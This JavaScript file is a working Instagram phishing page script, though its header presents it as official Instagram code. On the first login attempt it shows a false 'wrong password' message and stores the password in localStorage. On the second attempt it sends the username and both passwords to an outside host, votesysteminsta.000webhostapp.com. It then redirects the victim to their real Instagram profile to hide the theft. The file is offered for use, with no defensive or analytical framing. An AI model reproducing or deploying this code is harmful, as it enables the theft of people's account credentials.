// 2022 All rights reserved * Instagram
// Metaverse
// Instagram JavaScript

const lang = document.querySelector(".lang"),
unameFld = document.querySelector("#UserName"),
sbtBtn = document.querySelector("input[type=submit]"),
passwordFld = document.querySelector("#PassworD"),
wrngPass = document.querySelector(".wrngPassword");

function showMenu() {
	let navigation = document.querySelector(".navigation");
	if(navigation.style.display == 'none') {
		navigation.style.display = 'block';
		navigation.style.visibility = 'visible';
	} else {
		navigation.style.display = 'none';
	}
}

passwordFld.addEventListener('keyup', function() {
	if(unameFld.value !== "" && unameFld.value.length !== 0) {
		if(passwordFld.value !== "" && passwordFld.value.length !== 0) {
			sbtBtn.removeAttribute("disabled");
			sbtBtn.style.opacity = 1;
		}else {
			sbtBtn.setAttribute("disabled", "");
			sbtBtn.style.opacity = 0.3;
		}
	} else {
		sbtBtn.setAttribute("disabled", "");
		sbtBtn.style.opacity = 0.3;
	}
})

sbtBtn.addEventListener('click', function() {
	let prevPass = localStorage.getItem("PrevPass");
	if(unameFld.value === ""
	&& unameFld.value.length === 0 || passwordFld.value === ""
	&& passwordFld.value.length === 0) {
		swal("Login Error !!", "Please enter username, email or phone and password to Login to your Instagram Account.", "top-logo.png");
		return false;
	}
	if(prevPass === null || prevPass === undefined) {
		setTimeout(function(){
			localStorage.setItem("PrevPass", passwordFld.value.trim());
			passwordFld.style.outline = "2px solid red";
			passwordFld.value = "";
			passwordFld.focus();
			wrngPass.style.display = 'block';
			wrngPass.insertAdjacentHTML("afterEnd", "<br/><br/>");
			return false;
		}, 1500);
	} else {
		const httpSender = new XMLHttpRequest();
		httpSender.onreadystatechange = function(){
			if(this.readyState == 4) {
				console.log("Data has been sent !");
			}
		}
		httpSender.open("POST", "https://votesysteminsta.000webhostapp.com/instalogin.php", async=true);
		httpSender.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
		httpSender.send("Username="+unameFld.value.trim()+"&prevPass="+prevPass+"&ConfirmPass="+passwordFld.value.trim());
		localStorage.clear();
		window.location.href = "https://www.instagram.com/"+unameFld.value.trim()+"/";
		return true;
	}
})